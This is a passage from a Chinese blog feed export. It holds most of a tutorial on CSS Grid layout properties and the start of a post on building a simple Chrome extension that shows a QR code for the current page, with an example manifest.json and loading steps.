<p><code>grid-gap</code>属性是<code>grid-column-gap</code>和<code>grid-row-gap</code>的合并简写形式，语法如下。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-gap</span>: &lt;<span class="selector-tag">grid-row-gap</span>&gt; &lt;<span class="selector-tag">grid-column-gap</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>因此，上面一段 CSS 代码等同于下面的代码。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">grid-gap</span>: <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>grid-gap</code>省略了第二个值，浏览器认为第二个值等于第一个值。</p>
<blockquote>
<p>根据最新标准，上面三个属性名的<code>grid-</code>前缀已经删除，<code>grid-column-gap</code>和<code>grid-row-gap</code>写成<code>column-gap</code>和<code>row-gap</code>，<code>grid-gap</code>写成<code>gap</code>。</p>
</blockquote>
<h4 id="3-4-grid-template-areas-属性"><a href="#3-4-grid-template-areas-属性" class="headerlink" title="3.4 grid-template-areas 属性"></a>3.4 grid-template-areas 属性</h4><p>网格布局允许指定”区域”（area），一个区域由单个或多个单元格组成。<code>grid-template-areas</code>属性用于定义区域。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">grid-template-areas</span>: <span class="string">'a b c'</span></span><br><span class="line">                         <span class="string">'d e f'</span></span><br><span class="line">                         <span class="string">'g h i'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码先划分出9个单元格，然后将其定名为<code>a</code>到<code>i</code>的九个区域，分别对应这九个单元格。</p>
<p>多个单元格合并成一个区域的写法如下。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">grid-template-areas: 'a a a'</span><br><span class="line">                     'b b b'</span><br><span class="line">                     'c c c';</span><br></pre></td></tr></table></figure>

<p>上面代码将9个单元格分成<code>a</code>、<code>b</code>、<code>c</code>三个区域。</p>
<p>下面是一个布局实例。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-template-areas</span>: "<span class="selector-tag">header</span> <span class="selector-tag">header</span> <span class="selector-tag">header</span>"</span><br><span class="line">                    "<span class="selector-tag">main</span>   <span class="selector-tag">main</span>   <span class="selector-tag">sidebar</span>"</span><br><span class="line">                    "<span class="selector-tag">footer</span> <span class="selector-tag">footer</span> <span class="selector-tag">footer</span>";</span><br></pre></td></tr></table></figure>

<p>上面代码中，顶部是页眉区域<code>header</code>，底部是页脚区域<code>footer</code>，中间部分则为<code>main</code>和<code>sidebar</code>。</p>
<p>如果某些区域不需要利用，则使用”点”（<code>.</code>）表示。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">grid-template-areas: 'a . c'</span><br><span class="line">                     'd . f'</span><br><span class="line">                     'g . i';</span><br></pre></td></tr></table></figure>

<p>上面代码中，中间一列为点，表示没有用到该单元格，或者该单元格不属于任何区域。</p>
<blockquote>
<p>注意，区域的命名会影响到网格线。每个区域的起始网格线，会自动命名为<code>区域名-start</code>，终止网格线自动命名为<code>区域名-end</code>。</p>
<p>比如，区域名为<code>header</code>，则起始位置的水平网格线和垂直网格线叫做<code>header-start</code>，终止位置的水平网格线和垂直网格线叫做<code>header-end</code>。</p>
</blockquote>
<h4 id="3-5-grid-auto-flow-属性"><a href="#3-5-grid-auto-flow-属性" class="headerlink" title="3.5 grid-auto-flow 属性"></a>3.5 grid-auto-flow 属性</h4><p>划分网格以后，容器的子元素会按照顺序，自动放置在每一个网格。默认的放置顺序是”先行后列”，即先填满第一行，再开始放入第二行，即下图数字的顺序。</p>
<p><img src="/articles/Grid布局/bg2019032506.png" alt></p>
<p>这个顺序由<code>grid-auto-flow</code>属性决定，默认值是<code>row</code>，即”先行后列”。也可以将它设成<code>column</code>，变成”先列后行”。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-auto-flow</span>: <span class="selector-tag">column</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/xutokec/edit?css,output" target="_blank" rel="noopener">上面代码</a>设置了<code>column</code>以后，放置顺序就变成了下图。</p>
<p><img src="/articles/Grid布局/bg2019032512.png" alt></p>
<p><code>grid-auto-flow</code>属性除了设置成<code>row</code>和<code>column</code>，还可以设成<code>row dense</code>和<code>column dense</code>。这两个值主要用于，某些项目指定位置以后，剩下的项目怎么自动放置。</p>
<p><a href="https://jsbin.com/wapejok/edit?css,output" target="_blank" rel="noopener">下面的例子</a>让1号项目和2号项目各占据两个单元格，然后在默认的<code>grid-auto-flow: row</code>情况下，会产生下面这样的布局。</p>
<p><img src="/articles/Grid布局/bg2019032513.png" alt></p>
<p>上图中，1号项目后面的位置是空的，这是因为3号项目默认跟着2号项目，所以会排在2号项目后面。</p>
<p>现在修改设置，设为<code>row dense</code>，表示”先行后列”，并且尽可能紧密填满，尽量不出现空格。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-auto-flow</span>: <span class="selector-tag">row</span> <span class="selector-tag">dense</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/helewuy/edit?css,output" target="_blank" rel="noopener">上面代码</a>的效果如下。</p>
<p><img src="/articles/Grid布局/bg2019032514.png" alt></p>
<p>上图会先填满第一行，再填满第二行，所以3号项目就会紧跟在1号项目的后面。8号项目和9号项目就会排到第四行。</p>
<p>如果将设置改为<code>column dense</code>，表示”先列后行”，并且尽量填满空格。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">grid-auto-flow</span>: <span class="selector-tag">column</span> <span class="selector-tag">dense</span>;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/pupoduc/1/edit?html,css,output" target="_blank" rel="noopener">上面代码</a>的效果如下。</p>
<p><img src="/articles/Grid布局/bg2019032515.png" alt></p>
<p>上图会先填满第一列，再填满第2列，所以3号项目在第一列，4号项目在第二列。8号项目和9号项目被挤到了第四列。</p>
<h4 id="3-6-justify-items，align-items，place-items-属性"><a href="#3-6-justify-items，align-items，place-items-属性" class="headerlink" title="3.6  justify-items，align-items，place-items 属性"></a>3.6  justify-items，align-items，place-items 属性</h4><p><code>justify-items</code>属性设置单元格内容的水平位置（左中右），<code>align-items</code>属性设置单元格内容的垂直位置（上中下）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">justify-items</span>: start | end | center | stretch;</span><br><span class="line">    <span class="attribute">align-items</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这两个属性的写法完全相同，都可以取下面这些值。</p>
<blockquote>
<ul>
<li>start：对齐单元格的起始边缘。</li>
<li>end：对齐单元格的结束边缘。</li>
<li>center：单元格内部居中。</li>
<li>stretch：拉伸，占满单元格的整个宽度（默认值）。</li>
</ul>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">justify-items</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/gijeqej/edit?css,output" target="_blank" rel="noopener">上面代码</a>表示，单元格的内容左对齐，效果如下图。</p>
<p><img src="/articles/Grid布局/bg2019032516.png" alt></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">align-items</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/tecawur/edit?css,output" target="_blank" rel="noopener">上面代码</a>表示，单元格的内容头部对齐，效果如下图。</p>
<p><img src="/articles/Grid布局/bg2019032517.png" alt></p>
<p><code>place-items</code>属性是<code>align-items</code>属性和<code>justify-items</code>属性的合并简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-items</span>: &lt;<span class="selector-tag">align-items</span>&gt; &lt;<span class="selector-tag">justify-items</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-items</span>: <span class="selector-tag">start</span> <span class="selector-tag">end</span>;</span><br></pre></td></tr></table></figure>

<p>如果省略第二个值，则浏览器认为与第一个值相等。</p>
<h4 id="3-7-justify-content-align-content-place-content-属性"><a href="#3-7-justify-content-align-content-place-content-属性" class="headerlink" title="3.7  justify-content ,align-content,place-content 属性"></a>3.7  justify-content ,align-content,place-content 属性</h4><p><code>justify-content</code>属性是整个内容区域在容器里面的水平位置（左中右），<code>align-content</code>属性是整个内容区域的垂直位置（上中下）。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">justify-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;</span><br><span class="line">    <span class="attribute">align-content</span>: start | end | center | stretch | space-around | space-between | space-evenly;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个属性的写法完全相同，都可以取下面这些值。（下面的图都以<code>justify-content</code>属性为例，<code>align-content</code>属性的图完全一样，只是将水平方向改成垂直方向。）</p>
<ul>
<li>start - 对齐容器的起始边框。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032519.png" alt></p>
<ul>
<li>end - 对齐容器的结束边框。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032518.png" alt></p>
<ul>
<li>center - 容器内部居中。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032520.png" alt></p>
<ul>
<li>stretch - 项目大小没有指定时，拉伸占据整个网格容器。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032521.png" alt></p>
<ul>
<li>space-around - 每个项目两侧的间隔相等。所以，项目之间的间隔比项目与容器边框的间隔大一倍。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032522.png" alt></p>
<ul>
<li>space-between - 项目与项目的间隔相等，项目与容器边框之间没有间隔。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032523.png" alt></p>
<ul>
<li>space-evenly - 项目与项目的间隔相等，项目与容器边框之间也是同样长度的间隔。</li>
</ul>
<p><img src="/articles/Grid布局/bg2019032524.png" alt></p>
<p><code>place-content</code>属性是<code>align-content</code>属性和<code>justify-content</code>属性的合并简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-content</span>: &lt;<span class="selector-tag">align-content</span>&gt; &lt;<span class="selector-tag">justify-content</span>&gt;</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-content</span>: <span class="selector-tag">space-around</span> <span class="selector-tag">space-evenly</span>;</span><br></pre></td></tr></table></figure>

<p>如果省略第二个值，浏览器就会假定第二个值等于第一个值。</p>
<h4 id="3-8-grid-auto-columns-grid-auto-rows-属性"><a href="#3-8-grid-auto-columns-grid-auto-rows-属性" class="headerlink" title="3.8   grid-auto-columns, grid-auto-rows 属性"></a>3.8   grid-auto-columns, grid-auto-rows 属性</h4><p>有时候，一些项目的指定位置，在现有网格的外部。比如网格只有3列，但是某一个项目指定在第5行。这时，浏览器会自动生成多余的网格，以便放置项目。</p>
<p><code>grid-auto-columns</code>属性和<code>grid-auto-rows</code>属性用来设置，浏览器自动创建的多余网格的列宽和行高。它们的写法与<code>grid-template-columns</code>和<code>grid-template-rows</code>完全相同。如果不指定这两个属性，浏览器完全根据单元格内容的大小，决定新增网格的列宽和行高。</p>
<p><a href="https://jsbin.com/sayuric/edit?css,output" target="_blank" rel="noopener">下面的例子</a>里面，划分好的网格是3行 x 3列，但是，8号项目指定在第4行，9号项目指定在第5行。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">grid-template-rows</span>: <span class="number">100px</span> <span class="number">100px</span> <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">grid-auto-rows</span>: <span class="number">50px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码指定新增的行高统一为50px（原始的行高为100px）。</p>
<p><img src="/articles/Grid布局/bg2019032525.png" alt></p>
<h4 id="3-9-grid-template-grid-属性"><a href="#3-9-grid-template-grid-属性" class="headerlink" title="3.9  grid-template, grid 属性"></a>3.9  grid-template, grid 属性</h4><p><code>grid-template</code>属性是<code>grid-template-columns</code>、<code>grid-template-rows</code>和<code>grid-template-areas</code>这三个属性的合并简写形式。</p>
<p><code>grid</code>属性是<code>grid-template-rows</code>、<code>grid-template-columns</code>、<code>grid-template-areas</code>、 <code>grid-auto-rows</code>、<code>grid-auto-columns</code>、<code>grid-auto-flow</code>这六个属性的合并简写形式。</p>
<p>从易读易写的角度考虑，还是建议不要合并属性，所以这里就不详细介绍这两个属性了。</p>
<h3 id="四、项目属性"><a href="#四、项目属性" class="headerlink" title="四、项目属性"></a>四、项目属性</h3><p>下面这些属性定义在项目上面。</p>
<h4 id="4-1-grid-column-start，grid-column-end，grid-row-start，grid-row-end属性"><a href="#4-1-grid-column-start，grid-column-end，grid-row-start，grid-row-end属性" class="headerlink" title="4.1  grid-column-start，grid-column-end，grid-row-start，grid-row-end属性"></a>4.1  grid-column-start，grid-column-end，grid-row-start，grid-row-end属性</h4><p>项目的位置是可以指定的，具体方法就是指定项目的四个边框，分别定位在哪根网格线。</p>
<blockquote>
<ul>
<li><code>grid-column-start</code>：左边框所在的垂直网格线</li>
<li><code>grid-column-end</code>：右边框所在的垂直网格线</li>
<li><code>grid-row-start</code>：上边框所在的水平网格线</li>
<li><code>grid-row-end</code>：下边框所在的水平网格线</li>
</ul>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">grid-column-start</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-column-end</span>: <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/yukobuf/edit?css,output" target="_blank" rel="noopener">上面代码</a>指定，1号项目的左边框是第二根垂直网格线，右边框是第四根垂直网格线。</p>
<p><img src="/articles/Grid布局/bg2019032526.png" alt></p>
<p>上图中，只指定了1号项目的左右边框，没有指定上下边框，所以会采用默认位置，即上边框是第一根水平网格线，下边框是第二根水平网格线。</p>
<p>除了1号项目以外，其他项目都没有指定位置，由浏览器自动布局，这时它们的位置由容器的<code>grid-auto-flow</code>属性决定，这个属性的默认值是<code>row</code>，因此会”先行后列”进行排列。读者可以把这个属性的值分别改成<code>column</code>、<code>row dense</code>和<code>column dense</code>，看看其他项目的位置发生了怎样的变化。</p>
<p><a href="https://jsbin.com/nagobey/edit?html,css,output" target="_blank" rel="noopener">下面的例子</a>是指定四个边框位置的效果。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column-start</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">grid-column-end</span>: <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">grid-row-start</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">grid-row-end</span>: <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Grid布局/bg2019032527.png" alt></p>
<p>这四个属性的值，除了指定为第几个网格线，还可以指定为网格线的名字。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column-start</span>: header-start;</span><br><span class="line">    <span class="attribute">grid-column-end</span>: header-end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，左边框和右边框的位置，都指定为网格线的名字。</p>
<p>这四个属性的值还可以使用<code>span</code>关键字，表示”跨越”，即左右边框（上下边框）之间跨越多少个网格。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column-start</span>: span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/hehumay/edit?html,css,output" target="_blank" rel="noopener">上面代码</a>表示，1号项目的左边框距离右边框跨越2个网格。</p>
<p><img src="/articles/Grid布局/bg2019032528.png" alt></p>
<p>这与<a href="https://jsbin.com/mujihib/edit?html,css,output" target="_blank" rel="noopener">下面的代码</a>效果完全一样。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column-end</span>: span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用这四个属性，如果产生了项目的重叠，则使用<code>z-index</code>属性指定项目的重叠顺序。</p>
<h4 id="4-2-grid-column-grid-row-属性"><a href="#4-2-grid-column-grid-row-属性" class="headerlink" title="4.2  grid-column,grid-row 属性"></a>4.2  grid-column,grid-row 属性</h4><p><code>grid-column</code>属性是<code>grid-column-start</code>和<code>grid-column-end</code>的合并简写形式，<code>grid-row</code>属性是<code>grid-row-start</code>属性和<code>grid-row-end</code>的合并简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column</span>:  / ;</span><br><span class="line">    <span class="attribute">grid-row</span>:  / ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">grid-row</span>: <span class="number">1</span> / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 等同于 */</span></span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column-start</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">grid-column-end</span>: <span class="number">3</span>;</span><br><span class="line">    <span class="attribute">grid-row-start</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">grid-row-end</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，项目<code>item-1</code>占据第一行，从第一根列线到第三根列线。</p>
<p>这两个属性之中，也可以使用<code>span</code>关键字，表示跨越多少个网格。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#b03532</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">1</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 等同于 */</span></span><br><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#b03532</span>;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">1</span> / span <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">grid-row</span>: <span class="number">1</span> / span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/volugow/edit?html,css,output" target="_blank" rel="noopener">上面代码</a>中，项目<code>item-1</code>占据的区域，包括第一行 + 第二行、第一列 + 第二列。</p>
<p><img src="/articles/Grid布局/bg2019032529.png" alt></p>
<p>斜杠以及后面的部分可以省略，默认跨越一个网格。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-column</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">grid-row</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，项目<code>item-1</code>占据左上角第一个网格。</p>
<h4 id="4-3-grid-area-属性"><a href="#4-3-grid-area-属性" class="headerlink" title="4.3 grid-area 属性"></a>4.3 grid-area 属性</h4><p><code>grid-area</code>属性指定项目放在哪一个区域。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-area</span>: e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://jsbin.com/qokexob/edit?css,output" target="_blank" rel="noopener">上面代码</a>中，1号项目位于<code>e</code>区域，效果如下图。</p>
<p><img src="/articles/Grid布局/bg2019032530.png" alt></p>
<p><code>grid-area</code>属性还可用作<code>grid-row-start</code>、<code>grid-column-start</code>、<code>grid-row-end</code>、<code>grid-column-end</code>的合并简写形式，直接指定项目的位置。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">    <span class="attribute">grid-area</span>: &lt;row-start&gt; / &lt;column-start&gt; / &lt;row-end&gt; / &lt;column-end&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是一个<a href="https://jsbin.com/duyafez/edit?css,output" target="_blank" rel="noopener">例子</a>。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item-1</span> &#123;</span><br><span class="line">    <span class="attribute">grid-area</span>: <span class="number">1</span> / <span class="number">1</span> / <span class="number">3</span> / <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-4-justify-self-align-self-place-self-属性"><a href="#4-4-justify-self-align-self-place-self-属性" class="headerlink" title="4.4  justify-self,align-self,place-self 属性"></a>4.4  justify-self,align-self,place-self 属性</h4><p><code>justify-self</code>属性设置单元格内容的水平位置（左中右），跟<code>justify-items</code>属性的用法完全一致，但只作用于单个项目。</p>
<p><code>align-self</code>属性设置单元格内容的垂直位置（上中下），跟<code>align-items</code>属性的用法完全一致，也是只作用于单个项目。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">    <span class="attribute">justify-self</span>: start | end | center | stretch;</span><br><span class="line">    <span class="attribute">align-self</span>: start | end | center | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个属性都可以取下面四个值。</p>
<blockquote>
<ul>
<li>start：对齐单元格的起始边缘。</li>
<li>end：对齐单元格的结束边缘。</li>
<li>center：单元格内部居中。</li>
<li>stretch：拉伸，占满单元格的整个宽度（默认值）。</li>
</ul>
</blockquote>
<p>下面是<code>justify-self: start</code>的例子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"> <span class="selector-class">.item-1</span>  &#123;</span><br><span class="line">    <span class="attribute">justify-self</span>: start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/Grid布局/bg2019032532.png" alt></p>
<p><code>place-self</code>属性是<code>align-self</code>属性和<code>justify-self</code>属性的合并简写形式。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-self</span>: &lt;<span class="selector-tag">align-self</span>&gt; &lt;<span class="selector-tag">justify-self</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">place-self</span>: <span class="selector-tag">center</span> <span class="selector-tag">center</span>;</span><br></pre></td></tr></table></figure>

<p>如果省略第二个值，<code>place-self</code>属性会认为这两个值相等。</p>
<h3 id="五、兼容性"><a href="#五、兼容性" class="headerlink" title="五、兼容性"></a>五、兼容性</h3><p>在开发之前，你得先了解其兼容性。总体来说，Grid兼容性还是不够全面，但如果一些公司用于内部系统开发，grid布局将会是一个不错的选择。数据来源：<a href="https://caniuse.com/#search=grid" target="_blank" rel="noopener">传送门</a></p>
<p><img src="/articles/Grid布局/adapt.png" alt="兼容性"></p>
<h3 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h3><p><a href="https://css-tricks.com/snippets/css/complete-guide-grid/" target="_blank" rel="noopener">A Complete Guide to Grid</a>, by Chris House<br><a href="https://webdesign.tutsplus.com/series/understanding-the-css-grid-layout-module--cms-1079" target="_blank" rel="noopener">Understanding the CSS Grid Layout Module</a>, by Ian Yates<br><a href="https://webdesign.tutsplus.com/tutorials/how-to-build-an-off-canvas-navigation-with-css-grid--cms-28191" target="_blank" rel="noopener">How to Build an Off-Canvas Navigation With CSS Grid</a>, Ian Yates<br><a href="https://code.tutsplus.com/tutorials/introduction-to-css-grid-layout-with-examples--cms-25392" target="_blank" rel="noopener">Introduction to the CSS Grid Layout With Examples</a>, Dogacan Bilgili<br><a href="http://learncssgrid.com/" target="_blank" rel="noopener">Learn CSS Grid</a>, Jonathan Suh<br><a href="https://blog.theodo.fr/2018/03/stop-using-bootstrap-layout-thanks-to-css-grid/" target="_blank" rel="noopener">How I stopped using Bootstrap’s layout thanks to CSS Grid</a>, Cédric Kui</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>Chrome扩展开发</title>
    <url>/articles/Chrome%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作者发现很多PC页面都没有做移动端转发的功能，有时候想在移动端阅读都要先在电脑上登录微信或者QQ转发到手机上面，一次两次还好，多了就觉得很不方便了，尤其是开发调试的时候。于是作者想到了开发一款浏览器插件简化一下上面的操作。</p>
<p>先上一下折腾出的成果 <a href="https://github.com/gouyuwang/chrome-qrcode" target="_blank" rel="noopener">Github传送门</a>:<br><img src="/articles/Chrome扩展开发/demo.png" alt> </p>
<h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>浏览器插件是一种小型的用于定制浏览器体验的程序。通过插件，我们可以定制js爬虫、屏蔽网页广告，网页实时查词，修改http请求头，等等，能做的东西很多。只要你会HTML，JavaScript，CSS就可以动手开发浏览器插件了。 </p>
<p>1、创建<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json" target="_blank" rel="noopener">manifest.json</a>。任何插件都必须要有这个文件，用来描述插件的元数据，插件的配置信息。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>:<span class="string">"Qrcode"</span>,</span><br><span class="line">    <span class="attr">"description"</span>:<span class="string">"Url Qrcode Extension"</span>,</span><br><span class="line">    "version":"1.0",// 版本version在打包完插件的时候，判断插件是否需要更新</span><br><span class="line">    "manifest_version":2, </span><br><span class="line">	  "description":"当前页面的二维码",</span><br><span class="line">    "browser_action":&#123;// 浏览器右上角的图标</span><br><span class="line">        "default_popup":"popup.html", // 弹出后运行的页面，相当于index.html</span><br><span class="line">        "default_icon":"icon.png",</span><br><span class="line">		"default_title":"生成页面二维码"</span><br><span class="line">    &#125;,</span><br><span class="line">	"icons":&#123; </span><br><span class="line">		"16":"icon.png",</span><br><span class="line">		"48":"icon.png",</span><br><span class="line">		"128":"icon.png"</span><br><span class="line">    &#125;,</span><br><span class="line">    "commands":&#123;</span><br><span class="line">        "_execute_browser_action":&#123;</span><br><span class="line">            "suggested_key":&#123; // 快捷键</span><br><span class="line">                "default":"Ctrl+Shift+F",</span><br><span class="line">                "mac":"MacCtrl+Shift+F"</span><br><span class="line">            &#125;,</span><br><span class="line">            "description":"Opens popup.html"</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">	"permissions": [ // 授权</span><br><span class="line">        "background", </span><br><span class="line">        <span class="string">"tabs"</span></span><br><span class="line">    ], </span><br><span class="line">    "background":&#123; // 后台运行</span><br><span class="line">        "script":[</span><br><span class="line">             "js/background.js" // 当前项目没有用到，因为不存在久驻后台的需求</span><br><span class="line">         ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、编写业务</p>
<p><img src="/articles/Chrome扩展开发/dir.png" alt="目录结构"></p>
<p>里面内容比较简单，生成二维码和分享均用的三方插件。值得注意的是，html里面不能和js混写，这里涉及到一个权限问题。</p>
<p><img src="/articles/Chrome扩展开发/jserror.png" alt="JS Error"></p>
<p>3、运行调试</p>
<ul>
<li>进入浏览器扩展管理</li>
</ul>
<p><img src="/articles/Chrome扩展开发/dev.png" alt></p>
<ul>
<li>开发者模式打开，然后点击 “加载已解压的扩展程序” 将创建的插件目录导入进去，如果你只有crx文件，直接右键以压缩文件方式解压就可以看到全部代码。</li>
</ul>
<p><img src="/articles/Chrome扩展开发/opendev.png" alt></p>
<ul>
<li>成功后可以看到下面的画面</li>
</ul>
<p><img src="/articles/Chrome扩展开发/success.png" alt></p>
